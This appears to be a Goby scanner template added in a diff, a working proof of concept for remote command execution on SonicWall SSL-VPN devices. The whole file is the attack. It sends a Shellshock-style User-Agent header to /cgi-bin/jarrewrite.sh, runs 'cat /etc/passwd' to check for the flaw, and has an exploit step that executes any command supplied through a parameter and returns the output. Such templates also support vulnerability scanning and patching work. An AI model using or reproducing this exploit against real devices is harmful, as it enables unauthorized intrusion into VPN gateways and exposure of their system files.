@@ -1,0 +1,82 @@
+{
+      "Name": "SonicWall SSL-VPN 远程命令执行漏洞",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "(app=\"SonicWALL-Company's-product\" || app=\"SonicWALL-SSL-VPN\")",
+      "Description": "SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞",
+      "Product": "SonicWall SSL-VPN",
+      "Homepage": "https://www.sonicwall.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "cat /etc/passwd",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/jarrewrite.sh",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/jarrewrite.sh",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "() { :; }; echo ; /bin/bash -c '{{{Cmd}}}'"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-01-26 15:28:34",
+      "GobyVersion": "1.8.237"
+}
